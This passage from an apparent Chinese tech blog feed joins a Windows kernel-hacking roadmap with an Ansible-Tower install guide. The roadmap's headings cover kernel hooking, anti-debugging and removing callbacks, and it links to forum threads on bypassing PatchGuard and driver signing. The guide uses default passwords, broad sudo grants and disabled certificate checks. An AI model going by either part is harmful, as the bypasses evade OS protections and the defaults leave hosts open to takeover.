class="headerlink" title="2.20. 内核回调表（枚举、清除HOOK）"></a>2.20. 内核回调表（枚举、清除HOOK）</h3><p>……</p><h3 id="2-21-枚举句柄"><a href="#2-21-枚举句柄" class="headerlink" title="2.21. 枚举句柄"></a>2.21. 枚举句柄</h3><p>……</p><h3 id="2-22-关闭句柄"><a href="#2-22-关闭句柄" class="headerlink" title="2.22. .关闭句柄"></a>2.22. .关闭句柄</h3><p>……</p><h3 id="2-23-监控进程创建-退出（API-HOOK、回调）"><a href="#2-23-监控进程创建-退出（API-HOOK、回调）" class="headerlink" title="2.23. 监控进程创建/退出（API HOOK、回调）"></a>2.23. 监控进程创建/退出（API HOOK、回调）</h3><p>……</p><h3 id="2-24-监控线程创建-退出（API-HOOK、回调）"><a href="#2-24-监控线程创建-退出（API-HOOK、回调）" class="headerlink" title="2.24. 监控线程创建/退出（API HOOK、回调）"></a>2.24. 监控线程创建/退出（API HOOK、回调）</h3><p>……</p><h3 id="2-25-监控DLL加载（API-HOOK、回调）"><a href="#2-25-监控DLL加载（API-HOOK、回调）" class="headerlink" title="2.25. 监控DLL加载（API HOOK、回调）"></a>2.25. 监控DLL加载（API HOOK、回调）</h3><p>……</p><h2 id="3-文件相关"><a href="#3-文件相关" class="headerlink" title="3. 文件相关"></a>3. 文件相关</h2><h3 id="3-1-API层文件操作（枚举、复制、删除、重命名）"><a href="#3-1-API层文件操作（枚举、复制、删除、重命名）" class="headerlink" title="3.1. API层文件操作（枚举、复制、删除、重命名）"></a>3.1. API层文件操作（枚举、复制、删除、重命名）</h3><p>……</p><h3 id="3-2-FSD层文件操作（枚举、复制、删除、重命名）"><a href="#3-2-FSD层文件操作（枚举、复制、删除、重命名）" class="headerlink" title="3.2. FSD层文件操作（枚举、复制、删除、重命名）"></a>3.2. FSD层文件操作（枚举、复制、删除、重命名）</h3><p>……</p><h3 id="3-3-DISK层文件操作（读写）"><a href="#3-3-DISK层文件操作（读写）" class="headerlink" title="3.3. DISK层文件操作（读写）"></a>3.3. DISK层文件操作（读写）</h3><p>……</p><h3 id="3-4-解析NTFS-FAT32"><a href="#3-4-解析NTFS-FAT32" class="headerlink" title="3.4. 解析NTFS/FAT32"></a>3.4. 解析NTFS/FAT32</h3><p>……</p><h3 id="3-5-监控文件操作（API-HOOK、SFILTER、MINIFILTER）"><a href="#3-5-监控文件操作（API-HOOK、SFILTER、MINIFILTER）" class="headerlink" title="3.5. 监控文件操作（API HOOK、SFILTER、MINIFILTER）"></a>3.5. 监控文件操作（API HOOK、SFILTER、MINIFILTER）</h3><p>……</p><h2 id="4-注册表相关"><a href="#4-注册表相关" class="headerlink" title="4. 注册表相关"></a>4. 注册表相关</h2><h3 id="4-1-API层注册表操作（枚举、新建、删除、重命名）"><a href="#4-1-API层注册表操作（枚举、新建、删除、重命名）" class="headerlink" title="4.1. API层注册表操作（枚举、新建、删除、重命名）"></a>4.1. API层注册表操作（枚举、新建、删除、重命名）</h3><p>……</p><h3 id="4-2-解析HIVE操作注册表"><a href="#4-2-解析HIVE操作注册表" class="headerlink" title="4.2. 解析HIVE操作注册表"></a>4.2. 解析HIVE操作注册表</h3><p>……</p><h3 id="4-3-监控注册表操作（API-HOOK、回调、DKOH）"><a href="#4-3-监控注册表操作（API-HOOK、回调、DKOH）" class="headerlink" title="4.3. 监控注册表操作（API HOOK、回调、DKOH）"></a>4.3. 监控注册表操作（API HOOK、回调、DKOH）</h3><p>……</p><h2 id="5-HOOK相关"><a href="#5-HOOK相关" class="headerlink" title="5. HOOK相关"></a>5. HOOK相关</h2><h3 id="5-1-SSDT-HOOK-UNHOOK（包括SHADOW-SSDT）"><a href="#5-1-SSDT-HOOK-UNHOOK（包括SHADOW-SSDT）" class="headerlink" title="5.1. SSDT HOOK/UNHOOK（包括SHADOW SSDT）"></a>5.1. SSDT HOOK/UNHOOK（包括SHADOW SSDT）</h3><p>……</p><h3 id="5-2-INLINE-HOOK-UNHOOK-绕过（多种方法）"><a href="#5-2-INLINE-HOOK-UNHOOK-绕过（多种方法）" class="headerlink" title="5.2. INLINE HOOK/UNHOOK/绕过（多种方法）"></a>5.2. INLINE HOOK/UNHOOK/绕过（多种方法）</h3><p>……</p><h3 id="5-3-IRP-HOOK"><a href="#5-3-IRP-HOOK" class="headerlink" title="5.3. IRP HOOK"></a>5.3. IRP HOOK</h3><p>……</p><h3 id="5-4-OBJECT-HOOK-UNHOOK"><a href="#5-4-OBJECT-HOOK-UNHOOK" class="headerlink" title="5.4. OBJECT HOOK/UNHOOK"></a>5.4. OBJECT HOOK/UNHOOK</h3><p>……</p><h3 id="5-5-IDT-HOOK-UNHOOK"><a href="#5-5-IDT-HOOK-UNHOOK" class="headerlink" title="5.5. IDT HOOK/UNHOOK"></a>5.5. IDT HOOK/UNHOOK</h3><p>……</p><h3 id="5-6-EAT-HOOK-UNHOOK"><a href="#5-6-EAT-HOOK-UNHOOK" class="headerlink" title="5.6. EAT HOOK/UNHOOK"></a>5.6. EAT HOOK/UNHOOK</h3><p>……</p><h3 id="5-7-IAT-HOOK-UNHOOK"><a href="#5-7-IAT-HOOK-UNHOOK" class="headerlink" title="5.7. IAT HOOK/UNHOOK"></a>5.7. IAT HOOK/UNHOOK</h3><p>……</p><h3 id="5-8-MSR-HOOK-UNHOOK"><a href="#5-8-MSR-HOOK-UNHOOK" class="headerlink" title="5.8. MSR HOOK/UNHOOK"></a>5.8. MSR HOOK/UNHOOK</h3><p>……</p><h2 id="6-内核相关"><a href="#6-内核相关" class="headerlink" title="6. 内核相关"></a>6. 内核相关</h2><h3 id="6-1-枚举内核模块（链表、目录对象、暴搜）"><a href="#6-1-枚举内核模块（链表、目录对象、暴搜）" class="headerlink" title="6.1. 枚举内核模块（链表、目录对象、暴搜）"></a>6.1. 枚举内核模块（链表、目录对象、暴搜）</h3><p>……</p><h3 id="6-2-监控驱动加载（API-HOOK、回调）"><a href="#6-2-监控驱动加载（API-HOOK、回调）" class="headerlink" title="6.2. 监控驱动加载（API HOOK、回调）"></a>6.2. 监控驱动加载（API HOOK、回调）</h3><p>……</p><h3 id="6-3-枚举-删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）"><a href="#6-3-枚举-删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）" class="headerlink" title="6.3. 枚举/删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）"></a>6.3. 枚举/删除回调（进程、线程、映像、注册表、蓝屏、关机、对象、文件系统改变）</h3><p>……</p><h3 id="6-4-枚举-删除定时器（IO-DPC）"><a href="#6-4-枚举-删除定时器（IO-DPC）" class="headerlink" title="6.4. 枚举/删除定时器（IO/DPC）"></a>6.4. 枚举/删除定时器（IO/DPC）</h3><p>……</p><h3 id="6-5-枚举GDT"><a href="#6-5-枚举GDT" class="headerlink" title="6.5. 枚举GDT"></a>6.5. 枚举GDT</h3><p>……</p><h2 id="7-网络相关"><a href="#7-网络相关" class="headerlink" title="7. 网络相关"></a>7. 网络相关</h2><h3 id="7-1-内核网络通信（TDI、WSK）"><a href="#7-1-内核网络通信（TDI、WSK）" class="headerlink" title="7.1. 内核网络通信（TDI、WSK）"></a>7.1. 内核网络通信（TDI、WSK）</h3><p>……</p><h3 id="7-2-监控网络通信（WFP、TDI-HOOK、NDIS-HOOK、NDIS-FILTER）"><a href="#7-2-监控网络通信（WFP、TDI-HOOK、NDIS-HOOK、NDIS-FILTER）" class="headerlink" title="7.2. 监控网络通信（WFP、TDI HOOK、NDIS HOOK、NDIS FILTER）"></a>7.2. 监控网络通信（WFP、TDI HOOK、NDIS HOOK、NDIS FILTER）</h3><p>……</p><h3 id="7-3-枚举网络连接（API方法、发IRP法）"><a href="#7-3-枚举网络连接（API方法、发IRP法）" class="headerlink" title="7.3. 枚举网络连接（API方法、发IRP法）"></a>7.3. 枚举网络连接（API方法、发IRP法）</h3><p>……</p><h3 id="7-4-枚举-挂钩NDIS处理函数"><a href="#7-4-枚举-挂钩NDIS处理函数" class="headerlink" title="7.4. 枚举/挂钩NDIS处理函数"></a>7.4. 枚举/挂钩NDIS处理函数</h3><p>……</p><h3 id="7-5-流量统计-下载限速"><a href="#7-5-流量统计-下载限速" class="headerlink" title="7.5. 流量统计/下载限速"></a>7.5. 流量统计/下载限速</h3><p>……</p><h3 id="7-6-端口复用"><a href="#7-6-端口复用" class="headerlink" title="7.6. 端口复用"></a>7.6. 端口复用</h3><p>……</p><h2 id="8-64位系统专用"><a href="#8-64位系统专用" class="headerlink" title="8. 64位系统专用"></a>8. 64位系统专用</h2><h3 id="8-1-破解PATCHGUARD（动态-静态）"><a href="#8-1-破解PATCHGUARD（动态-静态）" class="headerlink" title="8.1. 破解PATCHGUARD（动态/静态）"></a>8.1. 破解PATCHGUARD（动态/静态）</h3><ul><li>《<a href="https://bbs.pediy.com/thread-187214.htm" target="_blank" rel="nofollow">过Patchguard的梗</a>》</li><li>《<a href="http://www.mengwuji.net/thread-2398-1-1.html" target="_blank" rel="nofollow">过patchguard源码</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-5893-1-1.html" target="_blank" rel="nofollow">在Win7x64上加载无签名驱动以及让PatchGuard失效(Win7x64内核越狱)</a>》</li><li>《<a href="https://bbs.pediy.com/thread-158157.htm" target="_blank" rel="nofollow">让PatchGuard变狗屎的那些方法</a>》</li></ul><h3 id="8-2-破解DSE（动态-静态）"><a href="#8-2-破解DSE（动态-静态）" class="headerlink" title="8.2. 破解DSE（动态/静态）"></a>8.2. 破解DSE（动态/静态）</h3><ul><li>《<a href="http://www.m5home.com/bbs/thread-7870-1-1.html" target="_blank" rel="nofollow">攻破WIN7~WIN10的KPP和DSE（WIN64内核越狱）</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-7880-1-1.html" target="_blank" rel="nofollow">WIN64免签名加载驱动SDK</a>》</li><li>《<a href="http://www.m5home.com/bbs/forum.php?mod=viewthread&amp;tid=8134" target="_blank" rel="nofollow">神奇的内核路径欺骗</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-7390-1-1.html" target="_blank" rel="nofollow">Win7x64全自动无提示破解PatchGuard和Driver Signature Enforcement</a>》</li><li>《<a href="http://www.m5home.com/bbs/thread-7845-1-1.html" target="_blank" rel="nofollow">在Win64系统上动态加载无签名驱动：WIN64UDL</a>》</li><li>《<a href="http://blog.csdn.net/zhuhuibeishadiao/article/details/51055046" target="_blank" rel="nofollow">Win7 x64动态开启DSE</a>》</li></ul><h2 id="9-杂项"><a href="#9-杂项" class="headerlink" title="9. 杂项"></a>9. 杂项</h2><h3 id="9-1-对象劫持"><a href="#9-1-对象劫持" class="headerlink" title="9.1. 对象劫持"></a>9.1. 对象劫持</h3><p>……</p><h3 id="9-2-符号操作"><a href="#9-2-符号操作" class="headerlink" title="9.2. 符号操作"></a>9.2. 符号操作</h3><p>……</p><h3 id="9-3-PE解析"><a href="#9-3-PE解析" class="headerlink" title="9.3. PE解析"></a>9.3. PE解析</h3><p>……</p><h3 id="9-4-反调试"><a href="#9-4-反调试" class="headerlink" title="9.4. 反调试"></a>9.4. 反调试</h3><p>……</p><h2 id="10-整体项目"><a href="#10-整体项目" class="headerlink" title="10. 整体项目"></a>10. 整体项目</h2><h3 id="10-1-PE工具"><a href="#10-1-PE工具" class="headerlink" title="10.1. PE工具"></a>10.1. PE工具</h3><p>……</p><h3 id="10-2-ARK"><a href="#10-2-ARK" class="headerlink" title="10.2. ARK"></a>10.2. ARK</h3><p>……</p><h3 id="10-3-调试器"><a href="#10-3-调试器" class="headerlink" title="10.3. 调试器"></a>10.3. 调试器</h3><p>……</p><h3 id="10-4-主动防御"><a href="#10-4-主动防御" class="headerlink" title="10.4. 主动防御"></a>10.4. 主动防御</h3><p>……</p><h3 id="10-5-沙箱"><a href="#10-5-沙箱" class="headerlink" title="10.5. 沙箱"></a>10.5. 沙箱</h3><p>……</p><h3 id="10-6-透明加密"><a href="#10-6-透明加密" class="headerlink" title="10.6. 透明加密"></a>10.6. 透明加密</h3><p>……</p><h3 id="10-7-VT级调试-反调试-主动防御"><a href="#10-7-VT级调试-反调试-主动防御" class="headerlink" title="10.7. VT级调试/反调试/主动防御"></a>10.7. VT级调试/反调试/主动防御</h3><p>……</p><h2 id="11-其他"><a href="#11-其他" class="headerlink" title="11. 其他"></a>11. 其他</h2><h3 id="11-1-MFC开发"><a href="#11-1-MFC开发" class="headerlink" title="11.1. MFC开发"></a>11.1. MFC开发</h3><ul><li>《<a href="https://www.cnblogs.com/findumars/p/6275607.html" target="_blank" rel="nofollow">VS2010/MFC编程入门教程之目录和总结</a>》</li><li>《<a href="http://www.jizhuomi.com/school/c/159.html" target="_blank" rel="nofollow">VS2010/MFC编程入门</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CE </tag>
            
            <tag> RING </tag>
            
            <tag> HOOK </tag>
            
            <tag> 驱动 </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ansible-Tower 部署笔记</title>
      <link href="/scm/ansibletower-bu-shu-bi-ji/"/>
      <url>/scm/ansibletower-bu-shu-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为时下最流行的自动化运维工具之一，Ansible 在业界应该是无人不知无人不晓的了。</p><p>作为一款轻量化的开源软件，它只需要简单地通过 SSH（对Linux平台）或 PowerShell（对Windows平台），无需被控主机安装客户端，就能实现远程操控、部署、升级等配置管理。</p><p>通过编写简单的 playbooks（yml） 脚本就能轻松对成千上万的主机进行区域管控、日常巡检等任务。</p><p>而 Ansible-Tower （旧称 AWX）作为其配套界面，使得 Ansible 更容易上手。</p><p><img src="./01.png"></p><p>这里提供一些官方资料：</p><ul><li><a href="https://www.ansible.com/">Ansible 官网</a> : <a href="https://www.ansible.com/">https://www.ansible.com/</a></li><li><a href="https://www.ansible.com/products/tower">Ansible-Tower 官网</a> : <a href="https://www.ansible.com/products/tower">https://www.ansible.com/products/tower</a></li><li><a href="https://docs.ansible.com/">Ansible 官方文档（全）</a> : <a href="https://docs.ansible.com/">https://docs.ansible.com/</a></li><li><a href="https://docs.ansible.com/ansible/latest/index.htmll">Ansible 官方教程（英文版）</a> : <a href="https://docs.ansible.com/ansible/latest/index.html">https://docs.ansible.com/ansible/latest/index.html</a></li><li><a href="http://www.ansible.com.cn/docs/intro.html">Ansible 官方教程（中文版）</a> : <a href="http://www.ansible.com.cn/docs/intro.html">http://www.ansible.com.cn/docs/intro.html</a></li><li><a href="https://github.com/ansible">Ansible Github</a> : <a href="https://github.com/ansible">https://github.com/ansible</a></li></ul><h2 id="1-部署说明"><a href="#1-部署说明" class="headerlink" title="1. 部署说明"></a>1. 部署说明</h2><p>本文主要记录了在 ubuntu 上部署 Ansible 和 Ansible-Tower 的过程。</p><p>虽然 Ansible-Tower 支持在多种操作系统版本上部署，但对于 ubuntu 只支持 14.0 和 16.0 两个版本（而 Ansible 则是支持到 ubuntu 18.0）。</p><p>为了可以同时安装 Ansible 和 Ansible-Tower ，本文选择了 ubuntu 16.0 系统进行安装。</p><h3 id="1-1-安装环境"><a href="#1-1-安装环境" class="headerlink" title="1.1. 安装环境"></a>1.1. 安装环境</h3><ul><li><strong>操作系统</strong>：Ubuntu 16.04.5 LTS</li><li><strong>预装软件</strong>：python 2.7、openssh</li></ul><h3 id="1-2-安装清单"><a href="#1-2-安装清单" class="headerlink" title="1.2. 安装清单"></a>1.2. 安装清单</h3><ul><li>pywinrm （要求版本至少为 0.2.2，若不管理 windows 机器则无需安装）</li><li>Ansible-2.7.5 （ 要求 python 版本 2.6 或 2.7 ）</li><li>PostgreSQL-9.6</li><li>Ansible-Tower-3.3.3 （ 要求 Ansible 版本至少为 2.2，PostgreSQL版本至少为 9.6 ）</li></ul><blockquote><p><strong>预装组件要求可查看官方手册指引</strong>：<a href="https://docs.ansible.com/ansible-tower/latest/html/quickinstall/prepare.html">https://docs.ansible.com/ansible-tower/latest/html/quickinstall/prepare.html</a></p></blockquote><h2 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2. 安装步骤"></a>2. 安装步骤</h2><p>注意下述步骤直接依次复制执行即可完成整个部署流程，其中对于命令行前缀：</p><ul><li>【#】表示 root 用户</li><li>【$】表示普通用户</li></ul><h3 id="2-1-安装-pywinrm（可选）"><a href="#2-1-安装-pywinrm（可选）" class="headerlink" title="2.1. 安装 pywinrm（可选）"></a>2.1. 安装 pywinrm（可选）</h3><pre><code># apt install python-pip            # 安装 pip# pip install --upgrade pip            # 更新 pip# pip install "pywinrm&gt;=0.2.2"        # 使用 pip 安装 pywinrm，此模块用于远程管理 windows 机器</code></pre><h3 id="2-2-添加相关用户并授权"><a href="#2-2-添加相关用户并授权" class="headerlink" title="2.2. 添加相关用户并授权"></a>2.2. 添加相关用户并授权</h3><pre><code># adduser ansible                    # 添加 ansible 专用用户# chmod u+w /etc/sudoers            # 修改 sudo 配置文件为可写# vi /etc/sudoers                    # 修改 sudo 配置文件，对 ansible 和 postgres 用户授权，便于后面安装root ALL=(ALL:ALL) ALLansible ALL=(ALL:ALL) ALLawx ALL=(ALL:ALL) ALL                # 安装 Ansible-Tower 时自动创建的用户postgres ALL=(ALL:ALL) ALL            # 安装 PostgreSQL 时自动创建的用户# chmod u-w /etc/sudoers</code></pre><h3 id="2-3-安装-Ansbile-2-7-5"><a href="#2-3-安装-Ansbile-2-7-5" class="headerlink" title="2.3. 安装 Ansbile-2.7.5"></a>2.3. 安装 Ansbile-2.7.5</h3><blockquote><p><strong>相关过程整理自官方手册</strong>：<a href="https://ansible-tran.readthedocs.io/en/latest/docs/intro_installation.html#apt-ubuntu">https://ansible-tran.readthedocs.io/en/latest/docs/intro_installation.html#apt-ubuntu</a></p></blockquote><pre><code># su - ansible                                        # 切换到 ansible 用户$ sudo apt-get install software-properties-common     # 在早期 Ubuntu 发行版中, “software-properties-common” 名为 “python-software-properties”，根据实际情况修改$ sudo apt-add-repository ppa:ansible/ansible$ sudo apt-get update$ sudo apt-get install ansible                        # 安装$ ansible --version                                    # 若安装成功，核验版本ansible 2.7.5config file = /etc/ansible/ansible.cfgconfigured module search path = [u'/home/ansible/.ansible/plugins/modules', u'/usr/share/ansible/plugins/modules']ansible python module location = /usr/lib/python2.7/dist-packages/ansibleexecutable location = /usr/bin/ansiblepython version = 2.7.15rc1 (default, Nov 12 2018, 14:31:15) [GCC 7.3.0]</code></pre><blockquote><p><strong>关于 Asible 的相关配置</strong>：<br>　　　○ 配置文件位置为 <code>/etc/ansible/ansible.cfg</code><br>　　　○ 主机清单文件为 <code>/etc/ansible/hosts</code> （用于配置主机分组、连接方式等）<br>　　　○ playbooks 目录位置默认为 <code>/etc/ansible/</code> ，若目录不存在，可手工创建</p></blockquote><h3 id="2-4-安装-PostgreSQL-9-6"><a href="#2-4-安装-PostgreSQL-9-6" class="headerlink" title="2.4. 安装 PostgreSQL-9.6"></a>2.4. 安装 PostgreSQL-9.6</h3><blockquote><p><strong>部分过程参考自CSDN</strong>：<a href="https://blog.csdn.net/zpf336/article/details/50843674">https://blog.csdn.net/zpf336/article/details/50843674</a></p></blockquote><pre><code># 注意 Ubuntu 16.0 默认的 PostgreSQL 安装源是 9.5 版本的，不符合要求，需要更新安装源后再安装$ sudo add-apt-repository "deb http://apt.postgresql.org/pub/repos/apt/ xenial-pgdg main"$ wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo apt-key add -$ sudo apt-get update$ sudo apt-get install postgresql-9.6# 安装完成后会自动新增数据库用户 postgres$ sudo su postgres                                    $ psql postgres                                 # 登录数据库ALTER USER postgres with PASSWORD 'postgres';     # 修改 postgres 用户的数据库密码\q                                                 # 退出数据库# 修改数据库配置（ 默认只允许本地连接，由于只有 Ansible-Tower 用，因此无需更改相关连接配置 ）$ vi /etc/postgresql/&lt;pg_version&gt;/main/postgresql.conf    # 此处的 &lt;pg_version&gt; 根据实际安装的 PostgreSQL 版本修改password_encryption = on                                # 去掉注释，启用密码验证登录方式# 重启数据库使配置生效$ sudo systemctl unmask postgresql$ sudo systemctl restart postgresql$ psql -U postgres -h 127.0.0.1                        # 测试本地账密登录CREATE USER ansible WITH PASSWORD 'ansible';         # 创建 Ansible-Tower 用的数据库用户 ansibleCREATE DATABASE tower OWNER ansible;                 # 创建 Ansible-Tower 用的数据库 towerGRANT ALL PRIVILEGES ON DATABASE tower TO ansible;    # 把 tower 库的所有权限授权给 ansible 用户\q                                                    # 退出数据库# 测试使用 ansible 用户登录 tower 数据库：$ psql -U ansible -h 127.0.0.1 -d tower\q# 可选（需图形界面支持）$ sudo apt-get install pgadmin3        # 可安装 PostgreSQL 库的图形客户端$ pgadmin3                             # 启动客户端</code></pre><h3 id="2-5-安装-Ansible-Tower-3-3-3"><a href="#2-5-安装-Ansible-Tower-3-3-3" class="headerlink" title="2.5. 安装 Ansible-Tower-3.3.3"></a>2.5. 安装 Ansible-Tower-3.3.3</h3><blockquote><p><strong>相关过程整理自官方手册</strong>：<a href="https://docs.ansible.com/ansible-tower/latest/html/quickinstall/download_tower.html">https://docs.ansible.com/ansible-tower/latest/html/quickinstall/download_tower.html</a></p></blockquote><blockquote><p><strong>部分过程参考自CSDN</strong>：<a href="https://blog.csdn.net/CodyGuo/article/details/78875717">https://blog.csdn.net/CodyGuo/article/details/78875717</a></p></blockquote><p>在 ubuntu 系统下，Ansible-Tower 只能下载 Ansible 的 playbooks 脚本，由 Ansible 在线安装。</p><p>playbooks 脚本可从 <a href="https://releases.ansible.com/ansible-tower/setup/?extIdCarryOver=true&amp;sc_cid=701f2000001OH6uAAG"><strong>此处</strong></a> 提取（目前最后的 latest 版是3.3.3）。</p><p>下载最后版本 <a href="https://releases.ansible.com/ansible-tower/setup/?extIdCarryOver=true&amp;sc_cid=701f2000001OH6uAAG"><code>ansible-tower-setup-latest.tar.gz</code></a> 后，上传到任意目录即可。</p><pre><code># 上传到 ansible-tower-setup-latest.tar.gz 到 /tmp 目录$ sudo su ansible                                    # 切换 ansible 用户执行安装过程$ tar xvzf ansible-tower-setup-latest.tar.gz        # 解包$ cd ansible-tower-setup-&lt;tower_version&gt;            # tower_version 根据实际的 Ansible-Tower 版本号修改$ vi inventory                                         # 修改安装配置，根据前面流程设置的参数对号入座即可[tower]localhost ansible_connection=local[database][all:vars]admin_password='admin'pg_host='127.0.0.1'pg_port='5432'pg_database='tower'pg_username='ansible'pg_password='ansible'rabbitmq_username=towerrabbitmq_password='admin'rabbitmq_cookie=cookiemonster# 执行安装$ sudo ./setup.sh</code></pre><h3 id="2-6-Ansible-Tower授权"><a href="#2-6-Ansible-Tower授权" class="headerlink" title="2.6. Ansible-Tower授权"></a>2.6. Ansible-Tower授权</h3><ul><li>安装成功后，可通过访问 <code>https://&lt;host_ip&gt;/</code> 登录 Ansible-Tower （<strong>只能使用 HTTPS 协议</strong>）</li><li>登录账密在前面安装时已配置为：admin/admin （登录成功后，可以在【Users】里面修改）</li><li>登录成功后需要导入License授权，License 可以在官网申请，官方提供了 10 个管理节点的 <a href="https://www.ansible.com/products/tower/trial?utm_campaign=Ansible+Tower+Product+Page&amp;utm_source=Website&amp;utm_medium=Ansible+Tower+Product+Page+Top+Banner+CTA&amp;hsCtaTracking=c2fa5df2-93a1-436f-bc6b-3b6c3814a3b2%7C63159af0-e463-4910-8b16-3a0c19224977">免费 License</a></li></ul><h2 id="3-附：被控主机为-Windows-时的额外配置"><a href="#3-附：被控主机为-Windows-时的额外配置" class="headerlink" title="3. 附：被控主机为 Windows 时的额外配置"></a>3. 附：被控主机为 Windows 时的额外配置</h2><blockquote><p><strong>相关内容参考自</strong>：<br>　　　○ 官方指引手册（英文版）：<a href="https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html">https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html</a><br>　　　○ 官方指引手册（中文版）：<a href="https://ansible-tran.readthedocs.io/en/latest/docs/intro_windows.html#">https://ansible-tran.readthedocs.io/en/latest/docs/intro_windows.html#</a><br>　　　○ 百度百家号：<a href="https://baijiahao.baidu.com/s?id=1580415145694814528&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1580415145694814528&amp;wfr=spider&amp;for=pc</a></p></blockquote><p>为了控制 Windows 主机，作为被控端的 Windows 必须具备以下几个条件：</p><ul><li>操作系统版本限制为：桌面版 Windows 7、8.1、10 ；服务器版 Windows Server 2008、2012、2016</li><li>Windows上必须已经安装了 PowerShell 3.0 或更新版本</li><li>Windows上必须已经安装了 .NET Framework 4.0 或更新版本</li><li>WinRM 服务已经被创建并启动服务，相关服务端口没有被防火墙等拦截</li></ul><h3 id="3-1-查看-PowerShell-与-NET-版本并升级"><a href="#3-1-查看-PowerShell-与-NET-版本并升级" class="headerlink" title="3.1. 查看 PowerShell 与 .NET 版本并升级"></a>3.1. 查看 PowerShell 与 .NET 版本并升级</h3><ul><li>运行 PowerShell  （注意不是 CMD，一般 Win8 之后都默认安装）</li><li>输入命令 <code>Get-Host</code> 可查看当前 PowerShell 版本</li><li>输入命令 <code>$PSVersionTable.CLRVersion</code> 可查看当前 .NET Framework 版本</li><li>若 PowerShell 版本不满足要求，可参考 <a href="https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html#upgrading-powershell-and-net-framework"><strong>此处</strong></a> 的升级步骤进行升级</li></ul><p><img src="./02.png"></p><h3 id="3-2-安装并查看-WinRM-服务"><a href="#3-2-安装并查看-WinRM-服务" class="headerlink" title="3.2. 安装并查看 WinRM 服务"></a>3.2. 安装并查看 WinRM 服务</h3><ul><li>详细安装步骤可参考 <a href="https://docs.ansible.com/ansible/latest/user_guide/windows_setup.html#winrm-setup"><strong>这里</strong></a></li><li>为方便起见，Ansible 官方已提供了 WinRM 的自动安装与配置脚本：<a href="https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1">https://github.com/ansible/ansible/blob/devel/examples/scripts/ConfigureRemotingForAnsible.ps1</a></li><li>下载脚本后，在 PowerShell 执行命令即可完成安装： <code>powershell.exe -ExecutionPolicy ByPass -File ConfigureRemotingForAnsible.ps1</code></li><li>安装完成后，输入命令 <code>winrm enumerate winrm/config/Listener</code> 或 <code>winrm qc</code> 可查看 WinRM 的服务状态</li><li>确认 WinRM 正在监听 HTTPS 5986 端口即配置成功，注意防火墙也要开放相关端口</li></ul><p><img src="./03.png"></p><h3 id="3-3-Ansible-测试-WinRM-连接"><a href="#3-3-Ansible-测试-WinRM-连接" class="headerlink" title="3.3. Ansible 测试 WinRM 连接"></a>3.3. Ansible 测试 WinRM 连接</h3><blockquote><p>注意，Ansible 主机必须已安装 pywinrm，相关步骤详见 <a href="http://exp-blog.com/2019/01/19/pid-3070/#2">这里</a></p></blockquote><p><strong>测试方法：</strong>修改 Ansible 主机的配置文件 <code>/etc/ansible/hosts</code>，在其末尾添加一行（其中 <code>${win_ip}</code>、 <code>${win_username}</code>、 <code>${win_password}</code> 需根据实际情况修改）：</p><pre><code>${win_ip} ansible_user="${win_username}" ansible_password="${win_password}" ansible_port="5986" ansible_connection="winrm" ansible_winrm_server_cert_validation="ignore" ansible_winrm_transport="ssl"</code></pre><p>然后执行命令 <code>ansible ${win_ip} -m win_ping</code> 即可，若响应为 pong 则配置成功：</p><p><img src="./04.png"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 软件配置管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ansible </tag>
            
            <tag> 版本控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 站点的 TTFB 过长？记一次 TTFB 的优化过程</title>
      <link href="/website/ji-yi-ci-ttfb-de-you-hua-guo-cheng/"/>
      <url>/website/ji-yi-ci-ttfb-de-you-hua-guo-cheng/</url>
      
